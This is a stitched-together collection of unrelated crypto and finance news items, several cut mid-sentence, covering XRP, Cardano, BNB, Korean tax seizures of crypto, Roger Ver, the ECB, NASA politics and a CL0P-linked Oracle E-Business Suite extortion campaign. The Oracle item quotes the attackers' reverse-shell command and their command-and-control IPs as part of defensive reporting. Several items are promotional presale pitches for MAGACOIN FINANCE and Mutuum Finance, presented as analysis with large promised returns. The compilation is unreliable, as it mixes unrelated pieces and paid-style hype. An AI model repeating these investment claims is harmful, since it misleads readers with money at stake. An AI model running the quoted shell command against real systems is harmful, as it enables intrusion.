Cardano creator specifically mentioned RLUSD, saying, “We would like to find a path to get RLUSD on Cardano ,” and revealed that Cardano was willing to handle the integration for free as a gesture of goodwill toward the XRP community. Hoskinson noted that discussions were ongoing regarding how to move forward in a way that benefits both parties. His comments suggest that the Cardano ecosystem could soon collaborate directly with Ripple-related projects, marking a shift from past years when the two communities were hostile toward each other .

He described Hoskinson’s statements as a bombshell and said the remarks show how DeFi on Bitcoin and XRP is poised to become a major sector in the market. He told viewers that the large amount of XRP not currently earning yield represents a massive opportunity , saying that as XRP holders begin staking and earning, more tokens will be removed from exchanges. This would reduce supply and strengthen long-term market value. He went on to say that XRP and Cardano are both positioned to benefit from this next phase of DeFi expansion, noting that while there was once friction between their respective communities, Hoskinson’s comments point to a potential alignment. Crypto AI Man concluded his video by expressing optimism about both projects, asserting that XRP and Cardano “can easily make us a lot of money in the next few months and years.” Disclaimer : This content is meant to inform and should not be considered financial advice.

Momentum indicators suggest potential short-term weakness. The RSI is teetering near the neutral line at 48, hinting that sellers could soon take control. The MACD histogram shows similar caution, facing a potential death cross below the signal line today, a classic sign of local tops and the onset of a new downtrend.

The South Korean newspaper Hankook Ilbo reported that the comments came from the National Tax Service (NTS) on October 9. A tax office in the South Korean city of Paju. (Source: Choi Gwang-mo [CC BY-SA 4.0]) South Korean Tax Agency: We Can Confiscate Your Cold Wallet Tax bodies around the country have already launched crackdowns on local tax evaders that hold crypto wallets on domestic trading platforms. In recent weeks, city authorities have expanded these to cover people who fail to pay water bills and traffic fines. But the NTS’ warning shows that the agency is aware that many crypto holders keep their coins offline, using self-custody solutions. An agency spokesperson said: “We can now monitor a non-compliant taxpayer’s crypto transaction history using [blockchain protocol] tracking programs. And if we suspect they are hiding their coins offline, we can conduct searches at their homes, confiscating [hard drives or PCs].” However, one notable blind spot appears to be standing in the NTS’ path. The newspaper wrote: “Problems occur in cases where non-compliant taxpayers use overseas crypto exchanges. Since domestic law does not apply overseas, the [NTS] must rely on the cooperation of foreign governments to determine the nature of a delinquent taxpayer’s assets.” And while the Multilateral Tax Administration Cooperation Agreement allows Seoul to work with 74 nations on tax collection matters, this may not be enough. South Korea has no such agreements with the United States, nor with nations like China or Russia. And there is evidence to suggest that an increasing number of South Korean crypto traders are shunning domestic platforms in favor of foreign or decentralized alternatives . Data from the Financial Supervisory Service (FSS), one of the country’s top financial regulators, shows that as of the first half of this year, the amount of crypto transferred from domestic exchanges to overseas firms or individual wallets amounted to 78.9 trillion won ($55.6 billion). Inside a tax office in Seoul, South Korea. (Source: Cryptonews.com) How Does The NTS Seize Crypto from Domestic Exchange Wallets? Under the terms of the National Tax Collection Act, the tax agency can impose “right to question and inspect” orders on individual accounts. The NTS usually issues these orders to exchanges in habitual non-payment cases, particularly if suspected tax evaders claim they cannot afford to pay their outstanding bills. If the NTS’ probes confirm that the individual holds crypto, the exchange responds by suspending their wallets. A comprehensive stock swap between Naver Financial and Dunamu could significantly boost Naver's corporate value and accelerate its entry into the digital asset payments sector, analysts said Friday. https://t.co/fvuk1zan7S — The Korea Times (@koreatimescokr) September 27, 2025 All coins in the account are then transferred to the NTS’ own wallets. Some local tax bodies then give crypto holders ultimatums, warning them that the tax agency will liquidate the tokens if the holders do not settle their tax bills. If they fail to respond, the agency immediately sells the crypto for fiat “at market price.” According to NTS data submitted to the offices of the Democratic Party lawmaker Kim Young-jin, the tax service “has seized and collected virtual assets from 14,140 delinquent taxpayers over the past four years.” This has seen the NTS and its regional affiliates liquidate 146.1 billion won ($103 million) worth of crypto in the same period.

According to analysts, this change in structure is a show of the institution’s seriousness about adding privacy features directly to the Ethereum ecosystem, moving it from a side project to a main development priority. Expanding Ethereum’s Privacy Framework In an October 8 blog post, EF noted that the “Privacy Cluster” integrates multiple ongoing projects under one umbrella, including long-running efforts by the Privacy & Scaling Explorations (PSE) team. PSE’s portfolio already includes more than 50 open-source research projects, such as Semaphore for anonymous signaling, MACI for private voting, zkEmail for secure communications, and TLSNotary for verifiable web interactions. Igor Barinov will be in charge of the new cluster, and Andy Guzman will still be in charge of PSE, which will focus on early-stage research and development. The group’s goal is to make private transactions, identity verification, and institutional operations safer and easier to use. Some of the most important projects are Private Reads & Writes, which lets users execute private actions on the blockchain; Private Proving, for verifiable proofs without data exposure; and the Institutional Privacy Task Force (IPTF), which connects regulatory compliance with on-chain functionality. Another tool that stands out is the Kohaku wallet SDK, which adds privacy-preserving cryptography for everyday use. The announcement comes just a few weeks after Ethereum developers went into detail about the Fusaka upgrade, which will be available on the mainnet on December 3, saying it will increase the amount of data that can be sent and received as well as the capacity of Layer-2 chains, which are key for scalable privacy. Ethereum’s Evolving Security and Value Proposition In its latest blog, the EF insisted that privacy research has been a part of Ethereum’s DNA since 2018. Given that the network processes billions of dollars in value every day, the foundation says that it is important to keep people’s, institutions’, and developers’ information private to maintain digital trust. The announcement also comes at a time when more institutions are getting involved with Ethereum. Some observers have suggested that the success of Grayscale’s new ETH staking ETF and the growing number of companies building ETH treasuries mean there’s now more scrutiny on Ethereum’s regulatory compliance and data protection, with the IPTF’s work probably gaining importance in these areas. Meanwhile, at the market, the world’s second-largest crypto asset was trading close to $4,400 at the time of this writing. Analysts think it could go as high as $13,000 if current market trends hold, with the blockchain’s security and privacy possibly affecting both adoption and investor confidence.

Both assets have gained fresh traction as large holders stockpile tokens and send them to cold storage—a classic sign of long-term confidence. After regulatory clarity starts to kick in and ETF filings become popular, investors speculate XRP and Solana will benefit from institutional inflows like Bitcoin and Ethereum. However, new on-chain data tells a more complex story. Although whales remain positive on XRP and Solana, many are diversifying their portfolios. Instead of only putting money into large-cap coins, they’re now investing their capital into emerging altcoins that promise much bigger multiples and early-stage growth potential. Why the ETF Buzz Matters An ETF for XRP would be a first in history, especially after Ripple’s court wins and the regulatory hurdles they cleared. If approved, it could unlock billions in institutional liquidity, further legitimising XRP as a settlement layer for global payments. The pressure is on for a Solana ETF as its network continues ruling the Layer-1 performance battle. Solana’s fast network and growing number of developers give it a good chance of being widely adopted soon. Almost everything is possible in the cryptocurrency market, but historical precedent counts against it. Although these assets are fundamentally strong and reliable, the next leg of growth may be steady rather than explosive in nature. That’s why whale wallets are increasingly rotating capital into small and fast-growing projects. MAGACOIN FINANCE Captures Whale Interest One of the primary beneficiaries of this rotation is MAGACOIN FINANCE, which has quickly established itself as an early project favourite. Analysts’ predictions are for huge returns of 40x by 2025, as the project’s presale is surging and whales are accumulating. MAGACOIN FINANCE is different because its unique story meets the fundamentals of the best coins. The tokenomics of the project understand DeFi utilities. This includes liquidity incentives. It also contains 100% audited contracts. By combining strong branding with genuine utility, this is likely one of the few new projects that strikes a balance between hype and creating value. Whales view this dual strength as a long-term possibility. MAGACOIN FINANCE is becoming a symbol of the new altcoin generation as its presale tiers sell out rapidly and community participation is accelerating, combining community-driven energy with real-world verifiable features. A Market Divided: Stability vs. Multiples In today’s investment environment, established blue-chip players like XRP and Solana are contrasted with rising stars such as MAGACOIN FINANCE. XRP and Solana are increasingly being viewed as institutional-grade assets. These are stable and regulatory-compliant and will attract conservative capital via ETFs. They are trustworthy cornerstones of a growing crypto environment. MAGACOIN FINANCE represents the high reward territory, the place whales go to multiply their capital rather than defend it. With low availability and viral momentum growing, presale action captures the same early-mover excitement that historically propelled projects like Dogecoin and Shiba Inu prior to their remarkable jumps. Whales seem to do both and lock positions in well-established mega-caps like XRP and Solana, while also taking early entries into next-gen plays like MAGACOIN FINANCE. Closing Thoughts The possibility of XRP and Solana ETFs is creating excitement in the crypto market. These changes may herald significant growth and validation for both assets in 2025. But, whale activity paints a broader picture – one where the most upside may be seen in smaller and more nimble projects that are still in infancy. Major capital is pouring into MAGACOIN FINANCE, which is quickly shaping up to be one of the breakout tokens of 2025. Early-stage opportunities like this are rare, and whales never ignore them.

Trump, who had once pulled the plug on the pick after a public fight with Musk and resistance inside his own administration, is again weighing the possibility after meeting Jared several times in recent weeks. Two men close to the story confirm Trump and Jared spoke face-to-face in September at a White House dinner for technology leaders, though Elon notably did not show up. The conversations did not stop there, as Bloomberg reported that Trump and Jared also held more private meetings to discuss what kind of future the space program should have under his watch. Trump dropped Jared after clashes with Elon Trump’s problem with the plan started back in June. After a heated back-and-forth with Elon over government spending, Trump posted on Truth Social: “I also thought it inappropriate that a very close friend of Elon, who was in the Space Business, run NASA, when NASA is such a big part of Elon’s corporate life.” He also called Jared a “blue blooded Democrat, who had never contributed to a Republican before.” That same month, Treasury Secretary Scott Bessent warned the White House about the nomination because of Jared’s financial ties to Elon’s company, as Shift4, the payments company Jared owns had invested $27.5 million into SpaceX. Because of that, Elon got into a heated argument with Scott that allegedly ended in the latter punching the former right on his face. Shortly after Elon’s very public breakup with Trump, the president named Transportation Secretary Sean Duffy interim head of NASA. So all of this naturally ended Jared’s official nomination, which was first submitted in December. He then stepped down from his role as CEO at Shift4, choosing to stay on only as executive chairman. In a letter to investors, Jared admitted the failed nomination was not easy but added: “Even knowing the outcome, I would do it all over again.” To his credit, Jared has credentials Trump apparently cannot ignore, having personally flew on two private space missions with SpaceX, one in 2021 and another in 2024, making him one of the very few non-government astronauts with real flight experience. Budget cuts, staff losses, and Elon’s security clearance fight While the nomination drama happens, Trump has also been pushing forward his plan to shrink NASA, as his federal budget proposal includes cutting more than $6 billion from the agency. Elon’s Department of Government Efficiency initiative (nicknamed DOGE) forced changes that cost the agency roughly 4,000 staff members, or one-fifth of its total workforce of 18,000. NASA’s operations have also been battered by the government shutdown in October. The agency kept exceptions in place only for missions connected to SpaceX and Jeff Bezos’ Blue Origin. That meant Elon’s rockets and projects still had workers on duty while other operations froze. Elon also faces another fight outside of budgets and staffing. On Wednesday, U.S. District Judge Denise Cote ordered the government to release information about what kinds of security clearances Elon has. The case was brought by The New York Times against the Defense Counterintelligence and Security Agency after it refused to provide records under the Freedom of Information Act. Judge Cote wrote: “The public has an interest in knowing whether the leader of SpaceX and Starlink holds the appropriate security clearances.” She ruled that Elon’s role as a “special government employee,” combined with his own public statements, outweighed arguments about privacy. The court pointed to a February post where Elon told millions of users: “I’ve had a top secret clearance for many years and have clearances that themselves are classified.” Judge Cote also pointed to Elon’s previous public comments about drug use, specifically in 2023 when he admitted to using ketamine, a federally controlled substance, and again in 2024 when he acknowledged that after smoking marijuana on a podcast, NASA imposed regular drug testing on him. “Musk’s numerous public statements regarding his own drug use and contacts with foreign leaders only enhance the public interest in disclosure,” Cote added. The judge gave the government until October 17 to propose redactions to the clearance documents. The ruling is the latest legal question tied to Elon’s controversial run inside the Trump White House, which ended in May.

52915691,602499,1760054409,https://resources.cryptocompare.com/news/13/52915691.jpeg,“BNB Szn” Is Here: BNB Chain Overtakes Ethereum And Solana In Cross-Chain Activity,https://bitcoinist.com/bnb-chain-overtakes-ethereum-solana-chain-activity/,"BNB is once again in the spotlight as it shatters its all-time high, reaching $1,347 just days after surpassing the $1,000 milestone for the first time in its history. This explosive move highlights Binance’s growing dominance in the crypto ecosystem, as both its token and blockchain ecosystem gain traction across multiple fronts. The rapid price acceleration demonstrates how investor confidence in Binance’s expanding network and utility continues to strengthen, even as the broader market awaits Bitcoin’s next breakout above current resistance levels. According to top analyst Darkfost, momentum across the BNB Chain is now clearly reflected in on-chain flows between networks, signaling a major shift in capital and activity. Binance’s ecosystem is attracting increased attention as DeFi, gaming, and cross-chain applications drive new demand for its infrastructure. This surge in BNB’s value represents more than just price speculation — it mirrors the chain’s expanding role as a central hub in the multichain economy. With the market entering a potential new phase of bullish expansion , BNB’s record-breaking rally positions it as one of the strongest assets in the current cycle, and analysts suggest that its momentum may only be getting started. BNB Chain Leads Cross-Chain Flows According to analyst Darkfost, fresh data from DeBridge confirms that BNB Chain currently ranks #1 in received cross-chain flows, surpassing both Ethereum and Solana — a remarkable milestone that highlights Binance’s growing influence across the crypto ecosystem. This leadership in on-chain activity is not only a technical achievement but also a signal of strong and sustained capital movement toward the Binance ecosystem. As liquidity flows into BNB Chain at record levels, the trend suggests that users and developers are increasingly choosing it as a preferred hub for DeFi, gaming, and tokenized projects. Darkfost explains that tracking these cross-chain flows offers valuable insight into the market’s structural direction. When capital migrates between chains, it often precedes broader price rotations within the altcoin market. Historically, these flow surges have aligned with the early stages of new cycles, where funds first move from Bitcoin into higher-risk assets. The fact that BNB Chain now leads this metric could therefore indicate growing institutional and retail interest converging around Binance’s ecosystem. The coming weeks will be critical for altcoins, as many analysts anticipate a sector-wide breakout if Bitcoin continues its upward momentum. Should BTC push decisively above resistance and enter price discovery, capital could rotate into BNB and other leading altcoins, sparking a fresh wave of rallies. BNB’s network dominance, combined with record-breaking price action, reinforces its status as one of the key barometers of crypto market health — and potentially, one of the biggest beneficiaries of the next bullish phase. Momentum Pauses After Explosive Rally BNB is taking a short breather after an extraordinary rally that pushed the token to an all-time high near $1,347 earlier this week. The chart shows that BNB is now trading around $1,277, down about 2.5% over the last 24 hours, as the market undergoes a mild correction following weeks of uninterrupted bullish momentum. Despite the pullback, the overall market structure remains decisively bullish, supported by rising 50-, 100-, and 200-period moving averages on the 4-hour timeframe. The recent consolidation above the $1,250–$1,270 range indicates that bulls are actively defending this zone, which now serves as short-term support. A rebound from here could set the stage for a new attempt to retest the $1,340–$1,350 resistance area. If this level breaks with conviction, it could open the door for another leg higher, potentially targeting $1,500 in the coming sessions. However, failure to maintain support above $1,250 could trigger deeper retracements toward $1,180 or even the $1,100 region, where the 50-period moving average currently lies. Overall, BNB remains one of the strongest performers in the market, showing sustained strength despite short-term volatility — a sign that investor confidence and on-chain activity continue to align with bullish momentum.

In a recent video shared on the social media platform X, crypto commentator Zach Rector described what he called the inconvenient truth of this market cycle: XRP is currently outperforming most of the top 50 cryptocurrencies in percentage growth since the last US presidential election and from the depths of the previous bear market. Ethereum, BNB, And Bitcoin’s Performance Rector began his comparison by pointing to Ethereum’s recovery trajectory. According to Ethereum’s price chart, investors who bought Ethereum before the most recent US presidential election have seen returns of about 89%, while long-term holders who entered during the 2022 bear market lows and are yet to sell are currently sitting on 400% gains. Related Reading: XRP Price Completes 7-Year Double Bottom Amid Prep For Moonshot To $19 BNB, he said, has delivered slightly better results, with 109% returns for pre-election buyers and 527% for those who accumulated during the 2022 bear market lows. Turning to Bitcoin, Rector noted that even after breaking to multiple new all-time highs this cycle, its returns are modest compared to XRP. He pointed out that a Bitcoin purchase before the election would have yielded an 82% return, while those who entered around the bear market bottom and are yet to sell would have gained around 678% on their Bitcoin holdings. XRP Outperforming The Market It’s a fact that XRP’s price action this cycle is much better than its performance in the 2021 crypto market bull run, where its growth was hampered by the SEC-Ripple lawsuit. Therefore, Zach Rector’s main point focuses on XRP’s strength within the current market cycle. Related Reading: Bitcoin, XRP Testing Key Resistances And Could Turn Messy Again – Here’s Why He stated that if an investor had purchased XRP at $0.50 before the election, their position would now be up 500%. On the other hand, those who bought at the bear market bottom and are still holding would have seen an extraordinary 900% gain. As such, these numbers make XRP one of the most profitable assets among the major cryptocurrencies, outperforming Bitcoin, Ethereum, and BNB. In his words, “The inconvenient truth about the 2025 crypto bull run, and this is why people are so upset, is that XRP is still outperforming nearly all of the top 50 cryptos.” The statement quickly gained traction within the XRP community, as shown by the comments on his video posted on X. XRP price action in the past few days, however, has been majorly corrective. The price has been drifting lower toward a critical support level around $2.80, which is now an important level for bulls to defend. A breakdown below $2.8 could expose the next support at $2.72, while maintaining it could set the stage for another upward move. Even with this cooling phase, many XRP enthusiasts and analysts are optimistic. Many expect the token to break above $4 in the coming months, with some predicting that it could eventually enter double-digit territory once Spot XRP ETFs are launched in the US.

The outlook is promising based on strong on-chain data that has seen whale accumulation and fresh capital entering Ripple’s ecosystem. According to market data, over the past few days, whale wallets ranging between 10 and 100 million XRP have added more than 250 million tokens, approximately $125 million worth of XRP. This buildup has strengthened bullish sentiment, indicating that large investors are lined up for another massive rally. With ETF speculation increasing to a fresh record and liquidity building, the long-term momentum behind the recovery appears to be strengthening for XRP, both from a retail and an institutional perspective. Amid this optimism, another cryptocurrency, MAGACOIN FINANCE, has risen on analysts’ radar, currently regarded as one of the most successful altcoins of the year. Ripple’s Market Position Strengthens Ahead of ETF Momentum Ripple is further growing its global value chain with partnerships with top banks and payment service providers. Several leading financial institutions are already implementing the company’s technology for cross-border transactions, underscoring its increasing relevance in the traditional finance domain. Recent announcements, such as Ripple’s strategic partnership with Bahrain Fintech Bay, highlight Ripple’s dedication to promoting blockchain adoption in emerging markets. This convergence of traditional and decentralized finance has solidified Ripple’s role as a central player in global payments. As ETF speculation intensifies, these developments solidify Ripple’s long-term price outlook, positioning XRP as a consistent contender on watchlists. XRP Price Analysis and Current Market Trends XRP is trading at around $2.97, holding strong support above the $2.80 mark, a strong price zone which analysts cite as the key point for the next breakout. Technical analysis indicators show that this support has proven to be strong against volatility, indicating that the market has been building confidence. Source: CoinMarketCap Trading volumes have also surged in recent weeks, as both whales and retail investors show increasing interest. With ETF optimism driving inflows, XRP has built up a distinct bullish structure that aligns with its long-term price outlook for 2025. If there is persistent momentum, a move towards the $5 resistance level is anticipated, indicating renewed market confidence for XRP. Market Analysts Project 40% ETF-Driven Upside Analysts anticipate ETF-related gains propelling XRP by a minimum of 40%, as institutional demand continues to grow exposure to legally acceptable crypto assets. Canary Capital CEO Steve McClurg now projects that the ETF could see another $10 billion inflow, up from the previously projected $5 billion. He stated that high investor demand would result in XRP being one of the top ten ETF launches of all time. Historical evidence supports this view. In past cycles, XRP inflows of $61 million have generated a $16.6 billion market cap increase for the asset, a multiplier of 272X XRP’s cost. Even with reduced levels, analysts believe ETF inflows could still create meaningful upside, taking XRP closer to its long-term target of $5. As XRP positions for a 40% upside, analysts are also switching their focus to another upcoming altcoin, MAGACOIN FINANCE. The project has become a trending topic amongst market watchers who predict up to 1,400% gains by the end of the year. This valuation projection is the result of an unparalleled surge in whale participation, pushing the early rounds of funding to close prematurely. Massive accumulation from large investors has sparked robust momentum that is triggering excitement across trading communities. This return of whales is a clear indicator that institutional buyers are forecasting a bull rally is coming. Their aggressive entry confidence has led retail investors to rush in to not miss the expected returns. This FOMO effect has heightened the discussion around the project’s ecosystem, with analysts calling MAGACOIN FINANCE one of the most mentioned new tokens currently in circulation. Its liquidity is increasing visibly, which is establishing it as one of the most promising high-ROI altcoins in 2025 . Factors Supporting the XRP $5 Target Several factors are fueling XRP’s expected bull run. ETF-led inflows are likely to add liquidity while institutionalizing exposure. Ripple’s growing integration across global banking networks serves as a stable demand base. Whale accumulation activity also sustains multiyear price stability, meaning major holders remain convinced. Combined with improving macro sentiment and increasing cryptocurrency inflows, these factors add to the positive case for XRP to reach the $5 mark during the upcoming market rally. Final Thoughts The latest XRP price prediction reinforces confidence in Ripple’s market outlook, with analysts pointing to ETF inflows as the next major catalyst. A 40% move remains realistic if institutional demand meets current projections. Alongside XRP’s institutional resurgence, MAGACOIN FINANCE continues to capture market attention as a high-ROI opportunity driven by whale accumulation and retail excitement. Together, these assets define the dual narrative of 2025, XRP for institutional strength, and MAGACOIN FINANCE for exponential returns.

The New York Times reported on Thursday that Ver’s attorneys and U.S. authorities had reached a provisional arrangement that would compel the proponent of Bitcoin to pay $48 million in taxes due on his cryptocurrency assets. In April 2024, the Justice Department sought to extradite him from Spain to stand prosecution on charges of tax evasion and mail fraud. According to The New York Times, Bitcoin Jesus has ties to figures associated with the administration of US President Donald Trump, including hiring lawyers who initially worked for the president. Reports indicate that he also paid $600,000 to Roger Stone, a political consultant and Trump adviser, to lobby for changes to U.S. tax laws. The development follows a series of regulatory and legal actions taken under the Trump administration, which eased the enforcement of digital asset cases. The original indictment alleges that Ver misrepresented information on tax forms related to his crypto holdings. According to the DOJ, he and two of his firms, Memory Dealers and Agilestar, allegedly held approximately 131,000 BTC in 2014. The DOJ added that he attempted to evade paying taxes on his assets by renouncing his U.S. citizenship and subsequently becoming a citizen of St. Kitts and Nevis. “Even though Ver was not then a US citizen, he was still legally required to report to the IRS and pay tax on certain distributions,” said the Justice Department in April 2024. Ties to Trump allies and lobbying efforts surface amid legal battle Spanish authorities arrested Ver following his U.S. indictment in 2024, though he secured bail just days later. Since then, his legal team has been contesting Spain’s extradition efforts and defending him against the charges in U.S. federal court. Following Donald Trump’s 2024 reelection, his administration has taken numerous steps toward being friendlier to the crypto sector, from dropping probes into big-name firms like Coinbase and Binance to designating supportive leadership at the helm of key federal agencies. Many in the crypto community speculated that the president might grant Bitcoin Jesus a pardon. Ross Ulbricht, the founder of the darknet marketplace Silk Road and one of the first individuals to receive a pardon from Trump, called for leniency in Ver’s case. “No one should spend the rest of their life in prison over taxes,” said Ulbricht in February. “Let him pay the tax (if any) and be done with it.” Crypto community rallies as speculation grows over a possible Trump pardon In a related episode, Bloomberg reported that a $30 million plan to buy a presidential pardon for Ver fell apart before it could move forward. The effort was allegedly led by two controversial figures: Florida businessman Matt Argall, who calls himself “Lord Argall,” and crypto entrepreneur Brock Pierce. They discussed the scheme over dinner in Puerto Rico after Trump’s reelection. As of Thursday, Ver’s X profile directed users to a petition urging Trump to pardon him. His website also featured an open letter calling on the U.S. government to drop the case, describing it as a “retaliatory action” against his advocacy for Bitcoin. On Thursday afternoon, traders on the prediction platform Polymarket raised the probability of Trump pardoning the Bitcoin proponent, increasing the odds from 23% to 29%. Get seen where it counts.

As a result, they agreed there was room to maintain a steady hand until clearer economic signals emerge, according to the meeting accounts released Thursday. The ECB kept interest rates on hold in September and even sounded a slightly optimistic note about the outlook for the euro area economy, suggesting that the bar is high for any further rate cuts despite remaining concerns about the effect of U.S. tariffs. At the time, Inflation was around the 2% medium-term target, and the Governing Council’s assessment of the inflation outlook was broadly unchanged. “The current level of interest rates should be seen as sufficiently robust in managing shocks, in view of two-sided inflation risks and taking into account a broad range of possible scenarios,” the accounts of the meeting showed. The new ECB staff projections presented an inflation outlook similar to that projected in June. They expected headline inflation to average 2.1% in 2025, 1.7% in 2026, and 1.9% in 2027. For inflation excluding energy and food, they expected an average of 2.4% in 2025, 1.9% in 2026, and 1.8% in 2027. The economy is projected to grow by 1.2% in 2025, revised up from the 0.9% expected in June. The growth projection for 2026 has been slightly lowered to 1.0%, while the projection for 2027 remains unchanged at 1.3%. ECB adopts wait-and-see stance as markets rule out more rate cuts for 2025 Since the September meeting, the likelihood of additional rate cuts has further diminished , supported by moderate economic data and recent comments from ECB President Christine Lagarde, who suggested that the risks surrounding the inflation outlook are narrowing. Markets now price in virtually no chance of a rate cut this year after a total of two percentage points of easing through June. Instead, traders see only a one-in-three probability of a final reduction in the first half of next year. While policymakers agreed that the economic outlook would inevitably shift, they were uncertain about the direction. “Several” members warned that inflation could fall short of the ECB’s 2% target, while a “few” cautioned it might exceed it. “The current situation was likely to change materially at some point, but it was currently difficult to know when and in which direction,” the ECB said. “There continued to be a high option value to waiting for more information.” ECB stays cautious as easing hopes fade amid fragile European outlook Despite this uncertainty, policymakers note d that in coming data largely aligned with their previous forecasts, and some of the worst-case risks had receded following a trade deal with the United States. For now, the ECB plans to monitor the evolving effects of tariffs, ongoing economic uncertainties, and other potential risks—including a stronger euro, Chinese dumping practices, a possible U.S. market correction, and rising defense expenditures. Still, investors believ e th e door to further easing hasn’t completely closed. Economic fragility persists across major European economies. France faces domestic turmoil, while Germany’s industrial production and exports to the U.S. are plunging. Household savings are climbing, private consumption remains sluggish, and corporate profits continue to shrink.

Google Threat Intelligence and Mandiant tracked the exploitation operation to attackers that might be associated with the CL0P extortion group. Google’s Threat Intelligence Group (GTIG) and Mandiant have brought an extensive extortion campaign that exploits the vulnerabilities in Oracle’s E-Business Suite (EBS) to light. The extortion campaign has resulted in the theft of large volumes of customer data. They said the operation began on September 29, 2025 and involved a group claiming ties to the CL0P extortion brand. Google and Mandiant reveal zero-day exploitation According to Google’s report, the attackers sent a “high volume” of emails to executives across multiple organizations, alleging breaches of their Oracle EBS environments and threatening to publish stolen data unless a ransom was paid . The emails, sent from hundreds of compromised third-party accounts, included contact addresses, support@pubstorm.com and support@pubstorm.net , previously linked to the CL0P data leak site. Google and Mandiant’s joint investigation found that the exploitation activity dates back to as early as July 2025, possibly linked to a zero-day vulnerability now tracked as CVE-2025-61882. In some cases, the attackers reportedly exfiltrated “a significant amount of data” from affected organizations. Oracle stated that the exploited flaws had been fixed in July, but later issued emergency updates on October 4 to address additional vulnerabilities. Oracle told its customers to use the latest critical patch updates and stressed that staying current on all patches is essential to prevent compromise. The CL0P extortion brand has been active since 2020 and is historically tied to the FIN11 cybercrime group. It has previously targeted managed file transfer systems like MOVEit, GoAnywhere, and Accellion FTA. Those campaigns followed a similar pattern of the mass exploitation of zero-day vulnerabilities, theft of sensitive data, and extortion weeks later. At the time of the report , no new victims from this incident had appeared on CL0P’s data leak site. Complex, multi-stage Java implants Google and Mandiant’s technical breakdown reveals that the attackers used multiple exploit chains targeting Oracle EBS components, including UiServlet and SyncServlet, to achieve remote code execution and plant multi-stage Java implants. In July 2025 there was suspicious activity that involved HTTP requests to /OA_HTML/configurator/UiServlet. This suspicious activity was observed in another exploit that later surfaced in a Telegram group named “SCATTERED LAPSUS$ HUNTERS.” The leaked exploit made use of several advanced techniques to gain control over targeted servers, such as a server-side request forgery (SSRF), an authentication bypass, and a XSL template injection. By August 2025, the attackers began using another tool called SyncServlet to make and run harmful templates inside the EBS database. These templates contained Base64-encoded XSL payloads that loaded Java-based malware directly into memory. Among the identified implants were GOLDVEIN.JAVA, a downloader that retrieved second-stage payloads from attacker-controlled command servers, and a multi-layered chain dubbed SAGE, which installed persistent Java servlet filters for further exploitation. After breaching the system, the attackers used the EBS account “applmgr” to explore the system, collect network and system details, and then install more malicious files. The attackers also used shell commands such as ip addr, netstat -an, and bash -i >& /dev/tcp/200.107.207.26/53 0>&1. The IP addresses 200.107.207.26 and 161.97.99.49 were identified in exploitation attempts, while 162.55.17.215:443 and 104.194.11.200:443 were listed as command-and-control servers for the GOLDVEIN.JAVA payload. GTIG has not formally linked the operation to any known group, but the campaign shares similarities with FIN11, which is a financially motivated cybercrime group that was previously associated with CL0P ransomware and large-scale data theft operations. Mandiant also noted that one of the compromised accounts used to send the extortion emails had been used in earlier FIN11-related attacks. Users are urged to be suspicious of EBS database tables XDO_TEMPLATES_B and XDO_LOBS, especially those with names beginning with “TMP” or “DEF”, and to block external internet traffic from EBS servers to prevent more data extortion. The organizations also recommend close monitoring of HTTP requests to endpoints like /OA_HTML/SyncServlet and /OA_HTML/configurator/UiServlet, and analyzing memory dumps for evidence of in-memory Java payloads. Google warned that CL0P-linked groups will almost certainly continue to dedicate their resources to acquiring zero-day exploits. Don’t just read crypto news. Understand it.

The development offers investors additional sources of yield on investment while fueling institutional demand. While these updates highlight the popularity and usage of premium blockchains, onlookers are eyeing Mutuum Finance (MUTM) , a brand-new coin with strong utility. The project is in Phase 6 of presale and is now available for $0.035 and is already over 60% sold out. With a double-lending platform, and a Certik audit to ensure security, Mutuum Finance provides investors the opportunity to be part of a project built for sustainable adoption and exponential growth potential, and thus it is one of the strong contenders for beyond the old crypto titans. Ethereum and Solana ETPs Launch with Staking as Grayscale Pioneers New Territory Ethereum (ETH) and Solana (SOL) are taking center stage as Grayscale becomes the first US issuer of crypto funds to offer staking for its exchange-traded products (ETPs). The tech allows investors to earn passive income on holding the Grayscale Ethereum Mini Trust ETF, Grayscale Ethereum Trust ETF (ETHE), and the Grayscale Solana Trust (GSOL), which is pending regulatory approval for a complete uplisting of ETP. By introducing staking, Grayscale is looking to provide investors access to the long-term appreciation of value for such networks, cementing both ETH and SOL as leading institutional and retail investor picks for yield. Such developments show the scalability of blue-chip blockchains, but forward-thinking investors seeking early-stage cryptos with real utility and scalable growth opportunities are turning to Mutuum Finance (MUTM) more and more. Mutuum Finance Presale Update Mutuum Finance (MUTM) remains in Phase 6 presale with more than 16,820 registered investors and more than $17 million committed. The numbers reflect growing market belief in the long-term potential of the project and renders it highly desirable investment ecosystem for investors to invest and earn sustainable incomes and long-term growth. The protocol also contains stringent Loan-to-Value (LTV) mix and dynamic liquidation protocol, both of which react in real time to shock prices. It also contains a 10% to 35% reserve multiplier by collateral risk profile that acts the role to add an extra layer of collateral in addition to the improvement of platform overall resilience. Mutuum Finance also has a $50,000 bug bounty program wherein it classifies vulnerabilities into four levels of risk – critical, major, minor, and low – with a solid mechanism of detection and prevention in advance before problems reach the community. Open architecture coupled with security by design makes Mutuum Finance a stable, secure, and long-lasting DeFi protocol. Mutuum Finance Lending & Borrowing Protocol Mutuum Finance also announced its groundbreaking lending and borrowing protocol , a major milestone in its evolving DeFi world. V1 will go live on Sepolia Testnet in Q4 2025 with its flagship features like liquidity pool, mtToken, debt token, liquidator bot, etc. ETH and USDT will be available as borrow, lend, and collateralizable assets on day one with an open-ended and scalable DeFi solution. Mutuum Finance Could Be 2025’s Breakout DeFi Gem As momentum in Ethereum and Solana grows with Grayscale’s newest staking products, the best potential upside may lie elsewhere. Mutuum Finance (MUTM), at a mere $0.035 and already 60% presale sold out in phase 6, offers real DeFi utility, audited security, and a next-gen lending protocol launching in Q4 2025. Those seeking early-stage growth potential before the next bull cycle should consider MUTM one of this year’s best bets.

